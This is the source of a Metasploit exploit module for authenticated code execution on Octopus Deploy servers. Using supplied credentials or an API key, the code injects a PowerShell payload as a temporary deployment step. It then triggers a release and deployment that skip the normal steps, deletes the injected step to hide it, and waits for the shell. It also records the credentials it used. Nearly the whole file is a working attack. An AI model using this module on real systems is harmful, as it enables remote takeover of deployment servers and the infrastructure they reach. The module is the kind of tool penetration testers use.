##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/exploit/powershell'
require 'json'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Powershell

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Octopus Deploy Authenticated Code Execution',
      'Description' => %q{
          This module can be used to execute a payload on an Octopus Deploy server given
          valid credentials or an API key. The payload is execued as a powershell script step
          on the Octopus Deploy server during a deployment.
      },
      'License'     => MSF_LICENSE,
      'Author'      => [ 'James Otten <jamesotten1[at]gmail.com>' ],
      'References'  =>
        [
          # Octopus Deploy docs
          [ 'URL', 'https://octopus.com' ]
        ],
      'DefaultOptions'  =>
        {
          'WfsDelay'    => 30,
          'EXITFUNC'    => 'process'
        },
      'Platform'        => 'win',
      'Targets'         =>
        [
          [ 'Windows Powershell', { 'Platform' => [ 'windows' ], 'Arch' => [ ARCH_X86, ARCH_X64 ] } ]
        ],
      'DefaultTarget'   => 0,
      'DisclosureDate'  => 'May 15 2017'
    ))

    register_options(
      [
        OptString.new('USERNAME', [ false, 'The username to authenticate as' ]),
        OptString.new('PASSWORD', [ false, 'The password for the specified username' ]),
        OptString.new('APIKEY', [ false, 'API key to use instead of username and password']),
        OptString.new('PATH', [ true, 'URI of the Octopus Deploy server. Default is /', '/']),
        OptString.new('STEPNAME', [false, 'Name of the script step that will be temporarily added'])
      ]
    )
  end

  def check
    res = nil
    if datastore['APIKEY']
      res = check_api_key
    elsif datastore['USERNAME'] && datastore['PASSWORD']
      res = do_login
    else
      begin
        fail_with(Failure::BadConfig, 'Need username and password or API key')
      rescue Msf::Exploit::Failed => e
        vprint_error(e.message)
        return CheckCode::Unknown
      end
    end
    disconnect
    return CheckCode::Unknown if res.nil?
    if res.code.between?(400, 499)
      vprint_error("Server rejected the credentials")
      return CheckCode::Unknown
    end
    CheckCode::Appears
  end

  def exploit
    # Generate the powershell payload
    command = cmd_psh_payload(payload.encoded, payload_instance.arch.first, remove_comspec: true, use_single_quotes: true)
    step_name = datastore['STEPNAME'] || rand_text_alphanumeric(4 + rand(32 - 4))
    session = create_octopus_session unless datastore['APIKEY']

    #
    # Get project steps
    #
    print_status("Getting available projects")
    project = get_project(session)
    project_id = project['Id']
    project_name = project['Name']
    print_status("Using project #{project_name}")

    print_status("Getting steps to #{project_name}")
    steps = get_steps(session, project_id)
    added_step = make_powershell_step(command, step_name)
    steps['Steps'].insert(0, added_step)
    modified_steps = JSON.pretty_generate(steps)

    #
    # Add step
    #
    print_status("Adding step #{step_name} to #{project_name}")
    put_steps(session, project_id, modified_steps)

    #
    # Make release
    #
    print_status('Getting available channels')
    channels = get_channel(session, project_id)
    channel = channels['Items'][0]['Id']
    channel_name = channels['Items'][0]['Name']
    print_status("Using channel #{channel_name}")

    print_status('Getting next version')
    version = get_version(session, project_id, channel)
    print_status("Using version #{version}")

    release_params = {
      "ProjectId"        => project_id,
      "ChannelId"        => channel,
      "Version"          => version,
      "SelectedPackages" => []
    }
    release_params_str = JSON.pretty_generate(release_params)
    print_status('Creating release')
    release_id = do_release(session, release_params_str)
    print_status("Release #{release_id} created")

    #
    # Deploy
    #
    dash = do_get_dashboard(session, project_id)

    environment = dash['Environments'][0]['Id']
    environment_name = dash['Environments'][0]['Name']
    skip_steps = do_get_skip_steps(session, release_id, environment, step_name)
    deployment_params = {
      'ReleaseId'            => release_id,
      'EnvironmentId'        => environment,
      'SkipActions'          => skip_steps,
      'ForcePackageDownload' => 'False',
      'UseGuidedFailure'     => 'False',
      'FormValues'           => {}
    }
    deployment_params_str = JSON.pretty_generate(deployment_params)
    print_status("Deploying #{project_name} version #{version} to #{environment_name}")
    do_deployment(session, deployment_params_str)

    #
    # Delete step
    #
    print_status("Getting updated steps to #{project_name}")
    steps = get_steps(session, project_id)
    print_status("Deleting step #{step_name} from #{project_name}")
    steps['Steps'].each do |item|
      steps['Steps'].delete(item) if item['Name'] == step_name
    end
    modified_steps = JSON.pretty_generate(steps)
    put_steps(session, project_id, modified_steps)
    print_status("Step #{step_name} deleted")

    #
    # Wait for shell
    #
    handler
  end

  def get_project(session)
    path = 'api/projects'
    res = send_octopus_get_request(session, path, 'Get projects')
    body = parse_json_response(res)
    body['Items'].each do |item|
      return item if item['IsDisabled'] == false
    end
    fail_with(Failure::Unknown, 'No suitable projects found.')
  end

  def get_steps(session, project_id)
    path = "api/deploymentprocesses/deploymentprocess-#{project_id}"
    res = send_octopus_get_request(session, path, 'Get steps')
    body = parse_json_response(res)
    body
  end

  def put_steps(session, project_id, steps)
    path = "api/deploymentprocesses/deploymentprocess-#{project_id}"
    send_octopus_put_request(session, path, 'Put steps', steps)
  end

  def get_channel(session, project_id)
    path = "api/projects/#{project_id}/channels"
    res = send_octopus_get_request(session, path, 'Get channel')
    parse_json_response(res)
  end

  def get_version(session, project_id, channel)
    path = "api/deploymentprocesses/deploymentprocess-#{project_id}/template?channel=#{channel}"
    res = send_octopus_get_request(session, path, 'Get version')
    body = parse_json_response(res)
    body['NextVersionIncrement']
  end

  def do_get_skip_steps(session, release, environment, payload_step_name)
    path = "api/releases/#{release}/deployments/preview/#{environment}"
    res = send_octopus_get_request(session, path, 'Get skip steps')
    body = parse_json_response(res)
    skip_steps = []
    body['StepsToExecute'].each do |item|
      if (!item['ActionName'].eql? payload_step_name) && item['CanBeSkipped']
        skip_steps.push(item['ActionId'])
      end
    end
    skip_steps
  end

  def do_release(session, params)
    path = 'api/releases'
    res = send_octopus_post_request(session, path, 'Do release', params)
    body = parse_json_response(res)
    body['Id']
  end

  def do_get_dashboard(session, project_id)
    path = "api/dashboard/dynamic?includePrevious=true&projects=#{project_id}"
    res = send_octopus_get_request(session, path, 'Get dashboard')
    parse_json_response(res)
  end

  def do_deployment(session, params)
    path = 'api/deployments'
    send_octopus_post_request(session, path, 'Do deployment', params)
  end

  def make_powershell_step(ps_payload, step_name)
    prop = {
      'Octopus.Action.RunOnServer' => 'true',
      'Octopus.Action.Script.Syntax' => 'PowerShell',
      'Octopus.Action.Script.ScriptSource' => 'Inline',
      'Octopus.Action.Script.ScriptBody' => ps_payload
    }
    step = {
      'Name' => step_name,
      'Environments' => [],
      'Channels' => [],
      'TenantTags' => [],
      'Properties' => { 'Octopus.Action.TargetRoles' => '' },
      'Condition' => 'Always',
      'StartTrigger' => 'StartWithPrevious',
      'Actions' => [ { 'ActionType' => 'Octopus.Script', 'Name' => step_name, 'Properties' => prop } ]
    }
    step
  end

  def send_octopus_get_request(session, path, nice_name = '')
    request_path = normalize_uri(datastore['PATH'], path)
    headers = create_request_headers(session)
    res = send_request_raw(
      'method' => 'GET',
      'uri' => request_path,
      'headers' => headers,
      'SSL' => ssl
    )
    check_result_status(res, request_path, nice_name)
    res
  end

  def send_octopus_post_request(session, path, nice_name, data)
    res = send_octopus_data_request(session, path, data, 'POST')
    check_result_status(res, path, nice_name)
    res
  end

  def send_octopus_put_request(session, path, nice_name, data)
    res = send_octopus_data_request(session, path, data, 'PUT')
    check_result_status(res, path, nice_name)
    res
  end

  def send_octopus_data_request(session, path, data, method)
    request_path = normalize_uri(datastore['PATH'], path)
    headers = create_request_headers(session)
    headers['Content-Type'] = 'application/json'
    res = send_request_raw(
      'method' => method,
      'uri' => request_path,
      'headers' => headers,
      'data' => data,
      'SSL' => ssl
    )
    res
  end

  def check_result_status(res, request_path, nice_name)
    if !res || res.code < 200 || res.code >= 300
      req_name = nice_name || 'Request'
      fail_with(Failure::UnexpectedReply, "#{req_name} failed #{request_path} [#{res.code} #{res.message}]")
    end
  end

  def create_request_headers(session)
    headers = {}
    if session.blank?
      headers['X-Octopus-ApiKey'] = datastore['APIKEY']
    else
      headers['Cookie'] = session
      headers['X-Octopus-Csrf-Token'] = get_csrf_token(session, 'Octopus-Csrf-Token')
    end
    headers
  end

  def get_csrf_token(session, csrf_cookie)
    key_vals = session.scan(/\s?([^, ;]+?)=([^, ;]*?)[;,]/)
    key_vals.each do |name, value|
      return value if name.starts_with?(csrf_cookie)
    end
    fail_with(Failure::Unknown, 'CSRF token not found')
  end

  def parse_json_response(res)
    begin
      json = JSON.parse(res.body)
      return json
    rescue JSON::ParserError
      fail_with(Failure::Unknown, 'Failed to parse response json')
    end
  end

  def create_octopus_session
    res = do_login
    if res && res.code == 404
      fail_with(Failure::BadConfig, 'Incorrect path')
    elsif !res || (res.code != 200)
      fail_with(Failure::NoAccess, 'Could not initiate session')
    end
    res.get_cookies
  end

  def do_login
    json_post_data = JSON.pretty_generate({ Username: datastore['USERNAME'], Password: datastore['PASSWORD'] })
    path = normalize_uri(datastore['PATH'], '/api/users/login')
    res = send_request_raw(
      'method' => 'POST',
      'uri' => path,
      'ctype' => 'application/json',
      'data' => json_post_data,
      'SSL' => ssl
    )

    if !res || (res.code != 200)
      print_error("Login failed")
    elsif res.code == 200
      report_octopusdeploy_credential
    end

    res
  end

  def check_api_key
    headers = {}
    headers['X-Octopus-ApiKey'] = datastore['APIKEY'] || ''
    path = normalize_uri(datastore['PATH'], '/api/serverstatus')
    res = send_request_raw(
      'method' => 'GET',
      'uri' => path,
      'headers' => headers,
      'SSL' => ssl
    )

    print_error("Login failed") if !res || (res.code != 200)

    vprint_status(res.body)

    res
  end

  def report_octopusdeploy_credential
    service_data = {
      address: ::Rex::Socket.getaddress(datastore['RHOST'], true),
      port: datastore['RPORT'],
      service_name: (ssl ? "https" : "http"),
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      private_type: :password,
      private_data: datastore['PASSWORD'].downcase,
      username: datastore['USERNAME']
    }

    credential_data.merge!(service_data)

    credential_core = create_credential(credential_data)

    login_data = {
      access_level: 'Admin',
      core: credential_core,
      last_attempted_at: DateTime.now,
      status: Metasploit::Model::Login::Status::SUCCESSFUL
    }
    login_data.merge!(service_data)
    create_credential_login(login_data)
  end
end